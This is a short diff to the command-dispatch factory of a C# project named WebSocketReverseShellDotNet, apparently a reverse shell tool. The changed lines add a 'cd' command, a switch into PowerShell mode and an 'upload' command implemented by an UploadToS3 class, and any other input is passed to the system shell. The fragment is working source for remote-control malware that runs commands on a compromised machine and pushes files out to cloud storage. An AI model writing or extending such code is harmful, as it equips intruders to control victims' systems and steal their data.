@@ -18,9 +18,14 @@ namespace WebSocketReverseShellDotNet.service.factory
             String firstArgument = commands[0].ToLower();
 
             Dictionary<string, Command> commandsList = new Dictionary<string, Command>(StringComparer.OrdinalIgnoreCase);
+            commandsList.Add("cd", new ChangeDirectoryCommand());
 
+            if (command.Equals("powershell", StringComparison.OrdinalIgnoreCase))
+            {
+                commandsList.Add("powershell", new TogglePowerShellCommand());
+            }
+            commandsList.Add("upload", new UploadToS3());
 
-            ;
             // If not found, redirect to the system command
             return commandsList.TryGetValue(firstArgument, out Command value)
                 ? value
